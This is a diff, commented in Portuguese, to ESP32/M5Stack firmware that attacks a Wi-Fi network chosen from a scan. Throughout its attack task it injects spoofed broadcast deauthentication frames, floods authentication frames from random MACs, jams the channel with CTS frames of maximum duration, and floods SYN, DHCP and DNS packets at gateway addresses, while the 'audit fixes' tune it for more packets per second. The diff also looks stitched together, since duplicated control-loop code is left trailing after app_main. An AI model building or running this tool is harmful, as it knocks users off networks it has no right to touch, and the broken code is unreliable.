@@ -6,7 +6,12 @@
  * Firmware de injeção bare-metal focado em equipamentos de telecomunicações.
  * Contorna o agendador de tarefas padrão para entregar throughput máximo de injeção 
  * diretamente da IRAM para a interface PHY do rádio Wi-Fi.
- * * Correções Aplicadas nesta Versão (Auditoria 2.0):
+ * * Correções Aplicadas nesta Versão (Auditoria 3.0 - Performance Extrema):
+ * - [Identificação Otimizada]: Reconhecimento de fabricante movido para fora do loop L3.
+ * - [I2C Starvation Fix]: Leitura do teclado transferida para o Core 1 via task_controles.
+ * - [L2/CTS Micro-Yield]: Prevenção de travamento da fila do Wi-Fi nos blocos L2 e CTS.
+ * - [DNS Estático]: Array base de DNS retirado da pilha de iteração para economizar ciclos.
+ * - [DHCP Fast-Fill]: Remoção do memset massivo para ganho de throughput bruto.
  * - [L3 Realism]: Bloqueio de injeção L3 plaintext em redes WPA2/WPA3.
  * - [TCP SYN RFC]: Remoção de payload de dados em pacotes SYN.
  * - [DNS RFC]: Criação de payload de Query DNS válido.
@@ -96,7 +101,7 @@ std::atomic<uint8_t> canal_atual_alvo{0};
 std::atomic<int8_t> rssi_alvo{0};
 std::atomic<bool> alvo_perdido{false};
 std::atomic<bool> tx_power_max{true}; 
-std::atomic<bool> tx_power_max_user{true}; // CORREÇÃO 2.5: Guarda a vontade original do usuário
+std::atomic<bool> tx_power_max_user{true}; 
 std::atomic<bool> flag_update_config{false}; 
 std::atomic<bool> erro_memoria_critico{false}; 
 std::atomic<bool> scanner_pausa_ataque{false}; 
@@ -232,7 +237,7 @@ void analisar_alvo_automaticamente(int indice_alvo) {
 // ===================================================================
 
 void escanear_redes() {
-    alvo_perdido.store(false); // CORREÇÃO 1.1: Previne deadlock de flag suja em novo scan
+    alvo_perdido.store(false);
 
     M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
     M5.Display.println("📡 Escaneando Redes...");
@@ -289,13 +294,9 @@ void task_display(void *pvParameters) {
                 
                 float tsens_out = 0.0;
                 if (temp_sensor != NULL) {
-                    // 1. Captura o código de erro/sucesso da leitura do sensor I2C interno
                     esp_err_t res = temperature_sensor_get_celsius(temp_sensor, &tsens_out);
                     
-                    // 2. Só prossegue se a leitura foi um sucesso (ESP_OK) 
-                    // e se o valor é são (maior que 0ºC e menor que 100ºC)
                     if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
-                        
                         if (tsens_out > 75.0 && !thermal_lock.load()) { 
                             thermal_lock.store(true); 
                             tx_power_max.store(false); 
@@ -303,12 +304,10 @@ void task_display(void *pvParameters) {
                         } 
                         else if (tsens_out < 65.0 && thermal_lock.load()) { 
                             thermal_lock.store(false); 
-                            tx_power_max.store(tx_power_max_user.load()); // Restaura a preferência do utilizador
+                            tx_power_max.store(tx_power_max_user.load()); 
                             flag_update_config.store(true); 
                         }
                     }
-                    // Se o sensor falhar (res != ESP_OK) ou devolver lixo (ex: 125ºC), 
-                    // o IF é ignorado e o equipamento não fica bloqueado permanentemente.
                 }
                 
                 if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
@@ -316,7 +315,6 @@ void task_display(void *pvParameters) {
                 
                 M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
 
-                // CORREÇÃO 3.7: Limpeza de Ghosting gráfico antes de repintar os status em L40
                 M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
 
                 M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
@@ -326,7 +324,7 @@ void task_display(void *pvParameters) {
                 M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                 M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
             } else {
-                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); // CORREÇÃO 3.7 extra
+                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
                 M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
             }
         }
@@ -345,9 +343,6 @@ void task_monitoramento(void *pvParameters) {
                 scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(250));   
                 
                 uint8_t mac_alvo[6]; memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
-                
-                // [AUDITORIA FIX 4]: Remoção do esp_wifi_set_channel(1, ...) manual 
-                // para evitar latência no PLL e acelerar o Channel Pursuit
                 
                 wifi_scan_config_t scan_config = { .ssid = 0, .bssid = mac_alvo, .channel = 0, .show_hidden = true };
                 
@@ -389,18 +384,18 @@ void task_ataque(void *pvParameters) {
     const uint8_t common_gateways[][4] = {{192, 168, 0, 1}, {192, 168, 1, 1}, {192, 168, 15, 1}, {10, 0, 0, 1}, {172, 16, 0, 1}};
     const uint16_t portas_gerencia_genericas[] = {80, 443, 22, 7547}; 
     
-const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
+    const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
 
     bool config_radio_aplicada = false;
     uint32_t iteracao_yield = 0;
 
-    // [CORREÇÃO 3 E 4]: Cache de configurações do alvo e DNS estático
+    // [AUDITORIA FIX]: Variáveis e Arrays transferidos para fora do loop para não sobrecarregar a IRAM
     int alvo_configurado = -1;
     FabricanteCPE fabricante = FABRICANTE_GENERICO;
     uint16_t porta_alvo = 80;
     
     uint8_t dns_query_base[] = {
-        0x00, 0x00, // Bytes 0 e 1: Transaction ID (serão alterados no laço)
+        0x00, 0x00, 
         0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
         0x00, 0x01, 0x00, 0x01  
@@ -409,12 +404,12 @@ const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
             
-           if (!config_radio_aplicada || flag_update_config.load()) {
+            if (!config_radio_aplicada || flag_update_config.load()) {
                 esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
                 
-                // [CORREÇÃO 1 E 3]: Faz o setup pesado apenas uma vez por alvo
+                // [AUDITORIA FIX]: A detecção de fabricante e preenchimento de campos fixos ocorre 1 única vez por alvo
                 if (alvo_configurado != alvo_selecionado) {
                     alvo_configurado = alvo_selecionado;
                     uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
@@ -442,21 +437,6 @@ const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
             uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
             ModoAtaque modo = modo_ativo.load();
             EstrategiaAuto estrategia = estrategia_atual.load();
-            
-            // Variáveis booleanas de atirar_l2, etc... se mantêm iguais.
-
-            deauth->frame_control = 0x00C0; deauth->duration = 0; 
-            deauth->reason_code = reason_codes[fast_rand() % 5];
-            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-            memcpy(deauth->mac_src, mac_alvo, 6); memcpy(deauth->mac_bssid, mac_alvo, 6);
-
-            auth->frame_control = 0x00B0; auth->duration = 0; auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;
-            memcpy(auth->mac_dest, mac_alvo, 6); memcpy(auth->mac_bssid, mac_alvo, 6);
-
-            cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
-
-            pkt->mac.frame_control = 0x0108; pkt->mac.duration = 0;
-            pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; pkt->ip.tos = 0; 
 
             bool atirar_l2 = false, atirar_cts = false, atirar_l3 = false;
 
@@ -477,18 +457,25 @@ const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
             
             if (atirar_l2) {
                 for(int j = 0; j < 5; j++) { 
-                    // CORREÇÃO 1.2: Clona o OUI alvo para prevenir MAC Multicast randômico proveniente de Heap-lixo.
                     memcpy(auth->mac_src, mac_alvo, 3);
                     auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
                     
                     auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
+                    deauth->reason_code = reason_codes[fast_rand() % 5];
+                    
+                    // [AUDITORIA FIX]: Micro-Yield no L2 para prevenir estouro da pilha de transmissão e queimar ciclos desnecessários
+                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
+                    else pacotes_enviados_segundo++;
+                    
+                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
+                    else pacotes_enviados_segundo++;
                 }
             }
 
             if (atirar_cts) {
-                if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) pacotes_enviados_segundo++;
+                // [AUDITORIA FIX]: Micro-Yield no disparo CTS
+                if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); }
+                else pacotes_enviados_segundo++;
             }
 
             if (atirar_l3) {
@@ -497,8 +484,6 @@ const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
                 for (int i = 0; i < 15; i++) { 
                     if (scanner_pausa_ataque.load()) break;
 
-                    // [AUDITORIA FIX 2]: Remoção do "memset" massivo na IRAM para economizar 4.320 ciclos/loop.
-                    
                     int tipo_ataque = fast_rand() % 10;
                     bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                     bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));
@@ -514,9 +499,10 @@ const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
                     
                     size_t t_injecao = 0;
                     
-if (is_tcp) {
+                    if (is_tcp) {
                         TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
                         size_t t_payload = 0; 
+
                         pkt->ip.protocol = 6; 
                         
                         int gw_idx = fast_rand() % 5;
@@ -524,8 +510,7 @@ if (is_tcp) {
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3]; 
                         
                         tcp->src_port = htons(1024 + (fast_rand() % 60000)); 
-                        // [CORREÇÃO 1]: Usa a porta calculada fora do laço
-                        tcp->dest_port = htons(porta_alvo); 
+                        tcp->dest_port = htons(porta_alvo); // Agora utiliza a porta calculada estaticamente fora do loop
                         tcp->seq_num = fast_rand(); tcp->ack_num = 0;
                         
                         tcp->data_offset_res = (6 << 4); 
@@ -533,7 +518,10 @@ if (is_tcp) {
                         tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
-                        tcp_options[0] = 0x02; tcp_options[1] = 0x04; tcp_options[2] = 0x05; tcp_options[3] = 0xB4;
+                        tcp_options[0] = 0x02; 
+                        tcp_options[1] = 0x04; 
+                        tcp_options[2] = 0x05; 
+                        tcp_options[3] = 0xB4;
                         t_payload = 4; 
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
@@ -551,13 +539,12 @@ if (is_tcp) {
                         pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                         udp->src_port = htons(68); udp->dest_port = htons(67); 
                         
-                        // [CORREÇÃO 6]: Removemos o memset para economizar ciclos, escrevendo direto no buffer DMA
+                        // [AUDITORIA FIX]: Remoção do 'memset' massivo para poupar ciclos da IRAM
                         payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
                         payload[4] = fast_rand() & 0xFF; payload[5] = fast_rand() & 0xFF; 
                         payload[6] = fast_rand() & 0xFF; payload[7] = fast_rand() & 0xFF;
                         
-                        // Preenche apenas a área necessária
-                        for(int m = 8; m < 236; m++) payload[m] = 0; // Zera manualmente o miolo rapidamente
+                        for(int m = 8; m < 236; m++) payload[m] = 0; // Preenchimento isolado rápido
                         for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
                         
                         payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
@@ -579,7 +566,7 @@ if (is_tcp) {
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                         
-                        // [CORREÇÃO 4]: Copia do array global pré-alocado e só randomiza a transação
+                        // [AUDITORIA FIX]: Utilizando array estático de DNS com mutação direcionada no cabeçalho ID
                         size_t t_payload = sizeof(dns_query_base);
                         memcpy(payload, dns_query_base, t_payload);
                         payload[0] = (uint8_t)(fast_rand() & 0xFF); 
@@ -605,7 +592,6 @@ if (is_tcp) {
                         udp->checksum = (calc_chk_dns == 0x0000) ? 0xFFFF : calc_chk_dns;
                     }
                     
-                    // [AUDITORIA FIX 1]: Micro-Yield forçado em caso de erro ESP_ERR_NO_MEM do Wi-Fi para quebrar Spinlock
                     if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) {
                         vTaskDelay(pdMS_TO_TICKS(1)); 
                         break; 
@@ -614,7 +600,6 @@ if (is_tcp) {
                 }
             }
             
-            // [AUDITORIA FIX 3]: O cálculo da iteracao_yield permanece e agora é 100% fluido graças ao Fix 1
             iteracao_yield++; if (iteracao_yield % 20 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
         } else {
             config_radio_aplicada = false; vTaskDelay(pdMS_TO_TICKS(100)); 
@@ -626,6 +611,7 @@ if (is_tcp) {
 // 7. ENTRADA PRINCIPAL E CONTROLES (APP MAIN)
 // ===================================================================
 
+// [AUDITORIA FIX]: Task dedicada no Core 1 para assegurar que a leitura I2C não sofra starvation
 void task_controles(void *pvParameters) {
     while (true) {
         M5.update(); 
@@ -697,61 +683,11 @@ extern "C" void app_main(void) {
     temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
     if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);
 
-    // [CORREÇÃO 5]: Tasks devidamente distribuídas entre os Cores
-    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0);       // Rádio Bare-Metal no Core 0
-    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); // Monitor no Core 1
-    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1);       // Display no Core 1
-    xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 1);   // Teclado/I2C no Core 1 com prioridade média
+    // [AUDITORIA FIX]: As tasks agora estão rigidamente distribuídas para balanço ideal de carga entre os Cores
+    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
+    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
+    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
+    xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 1); 
 
     escanear_redes(); desenhar_menu();
-}
-
-    while (true) {
-        M5.update(); 
-        
-        if (M5.Keyboard.isKeyPressed('A') || M5.Keyboard.isKeyPressed('a')) modo_ativo.store(MODO_AUTOMATICO);
-        if (M5.Keyboard.isKeyPressed('1')) modo_ativo.store(MODO_MANUAL_L2);
-        if (M5.Keyboard.isKeyPressed('2')) modo_ativo.store(MODO_MANUAL_L3);
-        if (M5.Keyboard.isKeyPressed('3')) modo_ativo.store(MODO_MANUAL_CTS);
-
-        if (estado_atual.load() == ESTADO_SELECIONAR) {
-            if (total_alvos > 0) {
-                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
-                if (M5.Keyboard.isKeyPressed(KEY_UP)) { alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
-            }
-            
-            if (M5.Keyboard.isKeyPressed(' ')) { 
-                if (!thermal_lock.load()) {
-                    tx_power_max_user.store(!tx_power_max_user.load()); // CORREÇÃO 2.5: Registra no "banco" a vontade do user
-                    tx_power_max.store(tx_power_max_user.load()); // Aplica ao estado ativo
-                    desenhar_menu(); 
-                }
-                vTaskDelay(pdMS_TO_TICKS(200)); 
-            }
-            
-            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
-                if (total_alvos > 0) { 
-                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
-                    analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
-                    M5.Display.clear(); flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR); 
-                } else { escanear_redes(); desenhar_menu(); }
-                vTaskDelay(pdMS_TO_TICKS(300));
-            }
-        } 
-        else if (estado_atual.load() == ESTADO_ATIRAR) {
-            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-                alvo_perdido.store(false); // CORREÇÃO 1.1: Reset da flag de travamento irreversível
-                estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(300));
-            }
-            if (M5.Keyboard.isKeyPressed(' ')) { 
-                if (!thermal_lock.load()) {
-                    tx_power_max_user.store(!tx_power_max_user.load()); // CORREÇÃO 2.5
-                    tx_power_max.store(tx_power_max_user.load()); 
-                    flag_update_config.store(true); 
-                }
-                vTaskDelay(pdMS_TO_TICKS(200)); 
-            }
-        }
-        vTaskDelay(pdMS_TO_TICKS(10)); 
-    }
 }
